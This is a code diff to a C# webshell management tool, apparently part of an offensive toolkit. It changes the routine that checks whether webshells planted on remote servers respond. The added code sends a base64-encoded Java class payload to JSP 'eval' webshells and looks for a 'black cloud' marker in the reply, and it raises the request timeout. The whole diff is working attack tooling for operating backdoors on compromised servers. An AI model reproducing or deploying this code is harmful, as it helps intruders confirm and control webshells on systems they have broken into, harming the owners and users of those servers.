@@ -656,7 +656,9 @@ namespace C2.Business.CastleBravo.WebShellTool
                 List<string> payloads = GenWebshellPayload(task, seed);
                 foreach (string payload in payloads)
                 {
-                    result = WebClientEx.Post(url, payload, 1500, Proxy);
+                    result = WebClientEx.Post(url, payload, 15000, Proxy);
+                    if (task.TrojanType == "jspEval")
+                        return result.Contains("black cloud");
                     if (result.Contains(seed.ToString()))
                         return true;
                 }
@@ -677,8 +679,8 @@ namespace C2.Business.CastleBravo.WebShellTool
                     return string.Format("response.write({0}-1)", seed + 1);
                 case "aspxEval":
                      return string.Format("response.write({0}-1)", seed + 1);
-                case "jspEval":  //TODO 重写，这压根没用
-                    return string.Format("out.println({0}-1)", seed + 1);
+                case "jspEval": 
+                    return "yv66vgAAADQAQwoADgAoBwApCgACACoIACsLACwALQsALAAuCAAvCgAwADELACwAMgcAMwoACgA0CgAOADUHADYHADcBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACUxQYXlsb2FkOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAARwY3R4AQAfTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHADYHADcHACkHADgHADMBAApTb3VyY2VGaWxlAQAMUGF5bG9hZC5qYXZhDAAPABABAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwAOQA6AQAXdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTgHADgMADsAPAwAPQA%2BAQALYmxhY2sgY2xvdWQHAD8MAEAAPAwAQQAQAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAQgAQDAAWABcBAAdQYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQALZmx1c2hCdWZmZXIBAA9wcmludFN0YWNrVHJhY2UAIQANAA4AAAAAAAIAAQAPABAAAQARAAAALwABAAEAAAAFKrcAAbEAAAACABIAAAAGAAEAAAAFABMAAAAMAAEAAAAFABQAFQAAAAEAFgAXAAEAEQAAAMwAAgAFAAAAMyvAAAJNLLYAA04tEgS5AAUCAC25AAYBABIHtgAILbkACQEApwAKOgQZBLYACyortwAMrAABAAoAIwAmAAoAAwASAAAAJgAJAAAACAAFAAkACgANABIADgAdAA8AIwASACYAEAAoABEALQATABMAAAA0AAUAKAAFABgAGQAEAAAAMwAUABUAAAAAADMAGgAbAAEABQAuABwAHQACAAoAKQAeAB8AAwAgAAAAGQAC%2FwAmAAQHACEHACIHACMHACQAAQcAJQYAAQAmAAAAAgAn";
                 default:
                     return string.Format("print({0}-1);", seed + 1);
 
